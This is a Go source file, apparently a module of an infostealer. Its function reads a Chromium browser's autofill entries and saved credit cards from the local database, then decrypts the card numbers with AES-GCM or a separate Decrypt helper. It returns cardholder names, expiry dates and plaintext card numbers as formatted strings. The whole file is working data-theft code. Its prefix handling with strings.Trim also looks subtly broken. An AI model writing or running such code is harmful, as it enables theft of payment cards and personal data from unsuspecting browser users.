package endpoint

import (
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"fmt"
	"strings"

	_ "github.com/mattn/go-sqlite3"
)

func ChromiumAutofill(paths string, masterKey []byte) (a, c []string) {
	cards := []string{""}
	text_autofill := []string{""}
	db_autofill, err := sql.Open("sqlite3", paths)
	if err == nil {
		defer db_autofill.Close()
		rows_autofill, err := db_autofill.Query("select name, value from autofill")
		if err == nil {
			defer rows_autofill.Close()
			autof := []autofill{}

			if err == nil {

				for rows_autofill.Next() {
					p := autofill{}
					err := rows_autofill.Scan(&p.name, &p.value)
					if err == nil {

						autof = append(autof, p)
					}
				}

				for _, p := range autof {
					text_autofill = append(text_autofill, fmt.Sprintf("%v\n%v\n\n", p.name, p.value))
				}
			}
		}

		rows_cards, err := db_autofill.Query("select name_on_card, expiration_month, expiration_year, card_number_encrypted from credit_cards")
		if err == nil {
			defer rows_cards.Close()

			for rows_cards.Next() {
				var CARD_HOLDER string
				var EXPIRY_MONTH int
				var EXPIRY_YEAR int
				var CARD_NUMBER string

				err = rows_cards.Scan(&CARD_HOLDER, &EXPIRY_MONTH, &EXPIRY_YEAR, &CARD_NUMBER)
				if err == nil {
					if strings.HasPrefix(CARD_NUMBER, "v10") {
						CARD_NUMBER = strings.Trim(CARD_NUMBER, "v10")
						if string(masterKey) != "" {
							ciphertext := []byte(CARD_NUMBER)
							c, err := aes.NewCipher(masterKey)
							if err == nil {
								gcm, err := cipher.NewGCM(c)
								if err == nil {

									nonceSize := gcm.NonceSize()
									if len(ciphertext) < nonceSize {
										geterr(err)
									}
									nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
									plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
									if err == nil {
										if string(plaintext) != "" {
											cards = append(cards, fmt.Sprint("CARDHOLDER: "+CARD_HOLDER+"\n"+"EXPIRY: "+fmt.Sprint(EXPIRY_MONTH)+"/"+fmt.Sprint(EXPIRY_YEAR)+"\nCARD NUMBER: "+string(plaintext), "\n", "\n"))
										}
									}
								}
							}
						}
					} else {
						pass, err := Decrypt([]byte(CARD_NUMBER))
						if err == nil {
							cards = append(cards, fmt.Sprint("CARDHOLDER: "+CARD_HOLDER+"\n"+"EXPIRY: "+fmt.Sprint(EXPIRY_MONTH)+"/"+fmt.Sprint(EXPIRY_YEAR)+"\nCARD NUMBER: "+string(pass), "\n", "\n"))
						}
					}
				}
			}
		}
	}

	return text_autofill, cards
}

type autofill struct {
	name  string
	value string
}
